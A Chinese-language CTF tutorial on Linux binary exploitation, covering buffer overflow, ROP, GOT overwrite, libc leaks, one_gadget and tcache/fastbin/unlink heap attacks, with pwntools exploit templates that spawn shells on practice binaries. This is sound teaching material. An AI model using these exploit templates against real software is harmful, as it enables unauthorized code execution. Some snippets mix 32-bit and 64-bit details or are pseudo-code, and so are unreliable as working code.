# Pwn（Binary Exploitation）

Pwn 是 CTF 中專注於「二進位程式漏洞利用」的題型，主要針對 Linux 執行檔進行分析與攻擊，常見漏洞有 Buffer Overflow、Format String、ROP、Heap Exploitation 等，目標多為奪取 shell 或取得 flag。

---

## 基礎概念與環境

### 二進位漏洞原理簡介

- C / C++ 程式常出現記憶體操作錯誤，例如：
  - 沒有限制字串長度
  - 沒有初始化記憶體
  - 使用危險函式（`gets`, `strcpy`）
- 利用這些錯誤可改寫 return address、函式指標、heap metadata 等，達成 RCE（Remote Code Execution）或資料洩漏。

---

### Pwn 題解流程：Exploit Roadmap

1. **觀察執行檔與服務：**
   - 分析是否為本機執行或遠端連線
   - 檢查 libc / libc.so.6 是否一致

2. **RE（Reverse Engineering）：**
   - 了解程式結構、流程與限制（Menu, 函式呼叫, 輸入限制）
   - 判斷輸入點與目標（如 `gets(buf)`、`scanf("%s",...)`）

3. **找出漏洞點（Vulnerability Spotting）：**
   - BOF（Buffer Overflow）
   - 格式化字串（Format String）
   - Use-After-Free / Double Free
   - Arbitrary Write / Read

4. **Leak：**
   - 想辦法取得 libc address / stack address / PIE base
   - 常見手法：puts(leak)、format string、資訊回顯

5. **Exploit：**
   - 利用 gadget、ROP chain、one_gadget、shellcode 等達成執行控制權

---

### 常用工具

#### pwntools（Python 爆破與利用腳本套件）
```bash
pip install pwntools
```

範例程式：
```python
from pwn import *
context.arch = 'amd64'

p = process('./vuln')
p.sendline(b'A' * 40 + p64(0xdeadbeef))
p.interactive()
```

#### GDB + pwndbg（除錯與分析）
```bash
sudo apt install gdb
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

常用指令：
- `start`：從頭開始執行
- `b *0xaddr`：在指定位址下中斷點
- `x/20x $rsp`：查看記憶體內容
- `context`：查看暫存器、stack、asm、heap

#### checksec（檢查執行檔防禦機制）
```bash
checksec ./vuln
```

輸出範例：
```
[*] '/home/jyc/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

---

### Linux 記憶體結構

```
+------------------------+
| Stack（高位址）         |
| - 本地變數、返回位址     |
+------------------------+
| Heap（malloc）         |
+------------------------+
| BSS (.bss)            |
| - 未初始化全域變數      |
+------------------------+
| Data (.data)          |
| - 已初始化全域變數      |
+------------------------+
| Text (.text)          |
| - 程式碼區，唯讀執行區   |
+------------------------+
```

- Stack 為向下成長（高位址 → 低位址）
- Heap 為向上成長（低位址 → 高位址）

---

### 編譯選項與保護機制

#### NX（No eXecute）
- 禁止執行 stack 區程式碼
- Shellcode 無法直接放 stack，需要轉向 ROP

#### PIE（Position Independent Executable）
- 程式位址隨機化，每次執行起始位址不同

#### Stack Canary
- 在 stack return address 前放一個隨機值，防止 overflow 改寫 return address

#### ASLR（Address Space Layout Randomization）
- 系統層級的隨機化位址保護（stack / heap / libc / PIE）

檢查方式：
```bash
cat /proc/sys/kernel/randomize_va_space
# 0: 關閉 1: 開啟部分 2: 全部啟用
```

---

## Buffer Overflow（BOF 緩衝區溢位）

Buffer Overflow 是 Pwn 題中最經典的漏洞類型。由於使用 `gets()`、`scanf("%s")`、`strcpy()` 等函式未檢查邊界，當輸入資料超過變數容量時，就可能覆蓋到 return address 或其他控制資料，進而改變程式流程。

---

### 攻擊原理

#### Stack Layout（範例）

```c
void vuln() {
    char buf[32];
    gets(buf);  // 無長度限制
}
```

記憶體配置如下（64-bit 系統）：
```
| return address | ← 被覆蓋的目標（8 bytes）
| saved RBP      |
|----------------|
| buf[31]        |
| ...            |
| buf[0]         | ← buffer 開頭
```

若輸入 `A * 40 + shellcode / return addr` 即可造成溢位。

---

### 利用流程

1. **觀察輸入函式與變數配置**
   - 是否使用 `gets`、`scanf("%s")`、`strcpy`
   - 堆疊空間多大（`char buf[?]`）
2. **使用 GDB 找 offset**
   - `cyclic` / `pattern_create` 產生測試字串
   - 找出覆蓋 return address 的 offset
3. **決定 payload 行為**
   - 呼叫 `win()`、`system("/bin/sh")` 等
   - 若有 NX，要改用 ROP 技巧

---

### 利用範例：Call Win Function

```c
void win() {
    system("/bin/sh");
}
void vuln() {
    char buf[40];
    gets(buf);
}
```

#### 1. 找 offset

使用 `cyclic`（pwntools 提供）：

```bash
cyclic 100
```

將產生一段測試字串，輸入程式後使其 crash，用 GDB 找出覆蓋 return address 的偏移：

```bash
gdb ./vuln
run
# Crash
info registers
# 找到 RIP = 0x6161616c 等值
cyclic -l 0x6161616c
# 得 offset = 44
```

#### 2. 編寫 Exploit

```python
from pwn import *
p = process('./vuln')

offset = 44
win_addr = 0x080491e2  # win() 的位址

payload = b'A' * offset + p32(win_addr)
p.sendline(payload)
p.interactive()
```

---

### 常見技巧

#### 使用 GDB 找 Stack Layout

```bash
gdb ./vuln
b vuln
r
# 輸入長字串
x/40x $rsp
# 觀察 buffer 與 return address 的距離
```

#### 使用 pwndbg 的 `pattern_create` / `pattern_offset`

```bash
pattern_create 100
# 得出測試字串，輸入造成 crash
pattern_offset 0x6161616c
```

---

### Stack BOF 的限制與對策

| 保護機制 | 說明 |
|----------|------|
| NX       | 無法執行 Stack 上的 shellcode，只能 ROP |
| Stack Canary | 被覆蓋時程式會 abort，無法直接控制 RIP |
| PIE      | 使程式位址隨機，不能直接 jump 固定位置 |

---

### 攻擊技巧總結

- 無 NX + 無 Canary：可直接放 shellcode
- 有 NX + 無 PIE：可直接 ROP
- 有 PIE：需要 leak 取得 base address
- 有 ASLR：需 leak libc base 來調用 `system`

---

### 練習平台推薦

- [picoCTF](https://picoctf.org/) - 基礎題豐富
- [ROP Emporium](https://ropemporium.com/) - 專門練習 BOF/ROP 題
- [CTF Wiki 範例](https://ctf-wiki.org/pwn/linux/bof/stack/) - 教學與實作詳盡

---

### 常見漏洞輸入函式（不安全）

| 函式      | 說明                     |
|-----------|--------------------------|
| `gets()`  | 不限制長度，最危險       |
| `scanf("%s")` | 無邊界檢查           |
| `strcpy()` | 無長度限制，需自行控制  |
| `read(fd, buf, size)` | 若 `size` 可控則危險 |

## ROP（Return Oriented Programming）

### 原理說明
- ROP 是一種繞過 DEP（資料執行防護）的攻擊手法。
- 透過程式中已存在的指令片段（gadget），組合成攻擊鏈（ROP chain）實現任意行為。
- 每個 gadget 結尾是 `ret`，透過 stack pivot 控制程式流程。

### 條件需求
- 存在任意寫或控制 return address 的漏洞（如 buffer overflow）
- 程式或 libc 未開啟 FULL RELRO，可覆寫 GOT
- 存在可利用的 gadget（可用 `ROPgadget` 等工具尋找）

### 常見 gadget 舉例
```asm
pop rdi; ret
pop rsi; pop r15; ret
pop rdx; ret
```

### ROP 利用範例：呼叫 system("/bin/sh")
```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
p = process('./vuln')

rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')  # leak 後回 main 重試

payload = flat({
    offset: rop.chain()
})
p.sendlineafter('>', payload)
```

---

## GOT / PLT 攻擊技巧

### GOT / PLT 是什麼？
- GOT（Global Offset Table）：儲存外部函式實際位址。
- PLT（Procedure Linkage Table）：程式初次呼叫函式時導向 GOT 查詢。

### 攻擊方式
- 覆寫 GOT 項目為自己想跳轉的位址（如 system）。
- 滲透條件：需未開啟 FULL RELRO（Partial RELRO 可寫 GOT）

### 範例：覆寫 GOT 使 `puts` → `system`
```python
elf.got['puts'] => 覆寫為 libc.symbols['system']
```

---

## Libc leak 與 one_gadget

### 為何需要 leak libc？
- 如果程式未提供 `system` 位址，我們需從某個 libc 函式的 leak 推出 libc base。
- 使用 `puts@plt` → `puts@got` 技巧。

### 計算 libc base
```python
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = puts_leak - libc.symbols['puts']
```

### one_gadget 是什麼？
- one_gadget 是指能一行就觸發 `/bin/sh` 的 gadget。
- 工具：[one_gadget](https://github.com/david942j/one_gadget)

```bash
one_gadget ./libc.so.6
```

### one_gadget 使用範例
```python
og = libc_base + 0xe6c7e
payload = flat({offset: og})
p.sendline(payload)
```

---

## Heap Exploitation

### fastbin attack

#### fastbin 是什麼？
- malloc 的一種 bin 類型，用於儲存小 chunk（< 0x80）。
- LIFO 儲存，自由串列容易被控制。

#### 攻擊技巧
- 偽造 fastbin chunk，使 malloc 回傳任意位置（如 GOT）
- 使用 `unlink` 技巧改寫目標位址

```c
// chunk A → free → fake chunk B (FD 指向 target)
// malloc → return target
```

---

### unlink attack

#### 原理
- 舊版 glibc 中的 unlink 操作會執行：
```c
fd->bk = bk;
bk->fd = fd;
```
- 若能控制 fd, bk，就能任意寫任意地址。

#### 利用條件
- free 被控制的 chunk 時觸發 unlink
- 需構造正確 fake chunk header（prev_size, size, fd, bk）

---

### tcache attack

#### tcache 是什麼？
- glibc 2.27+ 引入的快取機制。
- 針對每個 thread，儲存不同大小的 chunk（最多 7 個）

#### 攻擊技巧
- tcache poisoning：偽造 tcache next pointer，使 malloc 回傳任意地址。
- 常見用於劫持 `__malloc_hook`、`__free_hook`

```python
# tcache fd 指向 __free_hook
malloc(size)
free_hook = libc.symbols['system']
```

---

## CTF 常見攻擊模板與實戰技巧

### 1. 栈溢出跳 shell
```python
payload = b'A' * offset + p64(ret) + p64(system) + p64(exit) + p64(binsh)
```

### 2. libc leak + one_gadget
```python
puts_leak = leak()
libc_base = puts_leak - libc.symbols['puts']
og = libc_base + 0xe6c7e
payload = b'A'*offset + p64(og)
```

### 3. tcache poisoning（改 free_hook）
```python
free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']

# 使 malloc 回傳 free_hook 位址
edit_tcache(free_hook)
malloc()
write(system)
```

### 4. ROP 呼叫 execve("/bin/sh", NULL, NULL)
```python
rop = ROP(elf)
rop.raw('a' * offset)
rop.system(next(libc.search(b'/bin/sh')))
```

---

## 推薦工具與資源

- `pwntools`：Pwn 編程神器
- `ROPgadget`：尋找 gadget
- `one_gadget`：快速定位 one-liner shell
- `glibc-all-in-one`：各版本 libc 彙整
- `pwninit`：自動化 patch ELF

---

## 附錄：常見 libc one_gadget 偏移

| libc 版本       | one_gadget 偏移       |
|----------------|----------------------|
| libc-2.27.so   | 0x4f2c5, 0x4f322     |
| libc-2.29.so   | 0xe6c7e              |
| libc-2.31.so   | 0xe6c81              |
| libc-2.32.so   | 0xe6c84              |

可透過 `one_gadget` 工具查詢

---

